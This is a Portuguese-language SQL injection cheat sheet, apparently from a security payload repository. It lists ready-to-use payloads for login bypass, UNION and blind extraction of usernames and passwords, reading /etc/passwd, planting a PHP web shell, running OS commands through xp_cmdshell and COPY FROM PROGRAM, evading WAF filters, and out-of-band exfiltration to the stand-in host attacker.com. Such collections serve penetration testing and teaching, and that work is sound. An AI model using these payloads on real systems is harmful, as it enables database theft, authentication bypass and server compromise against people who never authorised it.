# 💉 Payloads de injeção SQL

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](SQLi.tr.md) • [🇬🇷 Ελληνικά](SQLi.el.md)

```
  ███████╗ ██████╗ ██╗     ██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██║     ██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗██║   ██║██║     ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║██║▄▄ ██║██║     ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║╚██████╔╝███████╗██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

> **Notas de precisão:** SQLi é injeção SQL; SGBD é sistema de gestão de bases de dados; OOB designa comunicação fora de banda. Os payloads dependem do SGBD, do contexto e dos privilégios. Em [MySQL](https://dev.mysql.com/doc/refman/8.0/en/comments.html), `--` precisa de um espaço ou carácter de controlo a seguir para iniciar um comentário; vários exemplos abreviados omitem essa condição. As funções XML e outras técnicas de erro dependem da versão. Em [PostgreSQL](https://www.postgresql.org/docs/current/functions-datetime.html#FUNCTIONS-DATETIME-DELAY), `pg_sleep` não devolve um inteiro: o exemplo que o mistura com o inteiro 1 num CASE pode falhar por incompatibilidade de tipos. Os exemplos Oracle OOB usam um identificador `version` não definido nesse trecho. As reticências de pesquisa de colunas/caracteres são instruções, não SQL executável.

---

<a id="-table-of-contents"></a>
## 📋 Índice

- [Payloads de deteção](#-detection-payloads)
- [Contorno da autenticação](#-authentication-bypass)
- [Injeção baseada em UNION](#-union-based-injection)
- [Injeção baseada em erros](#-error-based-injection)
- [Injeção SQL cega](#-blind-sql-injection)
- [Injeção baseada no tempo](#-time-based-injection)
- [Específico do SGBD](#-dbms-specific)
- [Contorno de WAF](#-waf-bypass)
- [Fora de banda](#-out-of-band)

---

<a id="-detection-payloads"></a>
## 🔍 Payloads de deteção

### Deteção básica

```sql
'
"
`
')
")
`)
'))
"))
`))

-- comment
/* comment */
# comment (MySQL)
```

### Deteção booleana

```sql
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
" OR "1"="1
" OR 1=1 --
' OR 'x'='x
' OR ''='
') OR ('1'='1
') OR ('x'='x
1' OR '1'='1
1" OR "1"="1
```

### Deteção aritmética

```sql
' OR 1=1--
' OR 1=2--
' AND 1=1--
' AND 1=2--
1 OR 1=1
1 AND 1=1
1 AND 1=2
```

### Concatenação de cadeias de caracteres

```sql
' || 'test
' + 'test
' 'test
```

---

<a id="-authentication-bypass"></a>
## 🔓 Contorno da autenticação

### Contorno do início de sessão

```sql
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1--
') OR ('1'='1--
' OR ''='
' OR 1=1-- -
```

### Campo de nome de utilizador

```sql
admin'--
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'/*
admin' OR 1=1--
admin'/*
```

### Campo de palavra-passe

```sql
' OR '1'='1
' OR ''='
' OR 1=1--
anything' OR '1'='1
```

### Combinações comuns de contorno

```sql
Username: admin'--
Password: anything

Username: ' OR 1=1--
Password: anything

Username: admin
Password: ' OR '1'='1

Username: ' OR '1'='1' --
Password: ' OR '1'='1' --
```

---

<a id="-union-based-injection"></a>
## 🔗 Injeção baseada em UNION

### Determinar o número de colunas

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...continuar até ocorrer um erro...

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### UNION básico

```sql
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
```

### Extração de dados

```sql
-- MySQL
' UNION SELECT user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- PostgreSQL
' UNION SELECT current_user,version()--
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- MSSQL
' UNION SELECT @@version,NULL--
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--

-- Oracle
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT table_name,NULL FROM all_tables--
```

### UNION com comentários

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3#
' UNION SELECT 1,2,3/*
' UNION SELECT 1,2,3;%00
```

---

<a id="-error-based-injection"></a>
## ⚠️ Injeção baseada em erros

### Injeção baseada em erros em MySQL

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--

' AND EXP(~(SELECT * FROM (SELECT version())x))--
```

### Injeção baseada em erros em MSSQL

```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

' AND 1=(SELECT TOP 1 CAST(username AS int) FROM users)--
```

### Injeção baseada em erros em PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS int)--

' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

### Injeção baseada em erros em Oracle

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--

' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

<a id="-blind-sql-injection"></a>
## 🔮 Injeção SQL cega

### Injeção cega baseada em condições booleanas

```sql
-- Condição verdadeira
' AND 1=1--
' AND 'a'='a'--

-- Condição falsa
' AND 1=2--
' AND 'a'='b'--

-- Extração de caracteres
' AND SUBSTRING(username,1,1)='a'--
' AND SUBSTRING((SELECT database()),1,1)='t'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--
```

### Pesquisa binária

```sql
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>112--
...reduzir o intervalo até identificar o carácter exato...
```

### Determinar o comprimento

```sql
' AND LENGTH(database())>1--
' AND LENGTH(database())>5--
' AND LENGTH(database())=7--
```

### Enumeração de tabelas/colunas

```sql
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--

' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--
```

---

<a id="-time-based-injection"></a>
## ⏱️ Injeção baseada no tempo

### MySQL

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

1' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE 't%')--
```

### PostgreSQL

```sql
'; SELECT pg_sleep(5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--
' || pg_sleep(5)--
```

### MSSQL

```sql
'; WAITFOR DELAY '0:0:5'--
' AND 1=1 WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### Oracle

```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)--
```

---

<a id="-dbms-specific"></a>
## 🗄️ Específico do SGBD

### Payloads de MySQL

```sql
-- Versão
' UNION SELECT @@version--
' UNION SELECT version()--

-- Utilizador atual
' UNION SELECT user()--
' UNION SELECT current_user()--

-- Base de dados
' UNION SELECT database()--

-- Tabelas
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- Colunas
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Ler um ficheiro
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Escrever um ficheiro
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

### Payloads de PostgreSQL

```sql
-- Versão
' UNION SELECT version()--

-- Utilizador atual
' UNION SELECT current_user--

-- Base de dados
' UNION SELECT current_database()--

-- Tabelas
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--

-- Ler um ficheiro
' UNION SELECT pg_read_file('/etc/passwd')--

-- Execução de comandos
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--
```

### Payloads de MSSQL

```sql
-- Versão
' UNION SELECT @@version--

-- Utilizador atual
' UNION SELECT SYSTEM_USER--

-- Base de dados
' UNION SELECT DB_NAME()--

-- Tabelas
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

-- Execução de comandos
'; EXEC xp_cmdshell 'whoami';--

-- Ativar xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

### Payloads de Oracle

```sql
-- Versão
' UNION SELECT banner FROM v$version WHERE rownum=1--

-- Utilizador atual
' UNION SELECT user FROM dual--

-- Base de dados
' UNION SELECT ora_database_name FROM dual--

-- Tabelas
' UNION SELECT table_name FROM all_tables--

-- Colunas
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
```

---

<a id="-waf-bypass"></a>
## 🛡️ Contorno de WAF

### Contorno de filtros de espaços

```sql
'/**/OR/**/1=1--
' OR/**/1=1--
'%09OR%091=1--
'%0AOR%0A1=1--
'%0COR%0C1=1--
'%0DOR%0D1=1--
'+OR+1=1--
```

### Contorno através de comentários

```sql
/*!50000SELECT*/ * FROM users
SELECT/**_**/ * FROM users
SELECT%0a* FROM users
```

### Variação de maiúsculas/minúsculas

```sql
' uNiOn SeLeCt 1,2,3--
' UnIoN sElEcT 1,2,3--
```

### Codificação

```sql
-- Codificação URL
%27%20OR%201=1--
%27%20UNION%20SELECT%201,2,3--

-- Dupla codificação URL
%2527%20OR%201=1--

-- Codificação hexadecimal
' UNION SELECT 0x61646d696e--  (admin in hex)
```

### Contorno de filtros de palavras-chave

```sql
-- Contorno de filtros de UNION
' UNION ALL SELECT
' /*!UNION*/ SELECT
' UN/**/ION SE/**/LECT

-- Contorno de filtros de SELECT
' UNION SEL/**/ECT
' UNION%0ASELECT
' UNION(SELECT)

-- Contorno de filtros de AND/OR
' && 1=1--
' || 1=1--
' %26%26 1=1--
' -1 || 1=1--
```

### HPP (HTTP Parameter Pollution, poluição de parâmetros HTTP)

```
?id=1&id=' OR '1'='1
?id=1/*&id=*/' OR '1'='1
```

---

<a id="-out-of-band"></a>
## 📡 Fora de banda

### MySQL OOB

```sql
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))
SELECT * INTO OUTFILE '\\\\attacker.com\\share\\output.txt'
```

### MSSQL OOB

```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

### PostgreSQL OOB

```sql
CREATE EXTENSION dblink; SELECT dblink_connect('host=attacker.com user=test password=test dbname=test')
```

### Oracle OOB

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version) FROM dual
SELECT HTTPURITYPE('http://attacker.com/'||version).GETCLOB() FROM dual
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Ordem de deteção

1. `'` — Aspa simples
2. `"` — Aspa dupla
3. `' OR '1'='1` — Injeção booleana
4. `' AND SLEEP(5)--` — Baseada no tempo
5. `' UNION SELECT NULL--` — Baseada em UNION

### Endpoints comuns

```
- Formulários de início de sessão
- Campos de pesquisa
- ID de utilizador nos URL
- Valores dos cookies
- Cabeçalhos HTTP (User-Agent, Referer)
- Parâmetros de API
```

### Comentários SQL por SGBD

| SGBD | Comentários |
|------|----------|
| MySQL | `-- `, `#`, `/* */` |
| PostgreSQL | `-- `, `/* */` |
| MSSQL | `-- `, `/* */` |
| Oracle | `-- `, `/* */` |

---

<a id="-resources"></a>
## 📚 Recursos

- [Injeção SQL na PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

<p align="center">
  <b>💉 Arsenal de injeção SQL</b><br>
  <i>Apenas para fins educativos!</i>
</p>
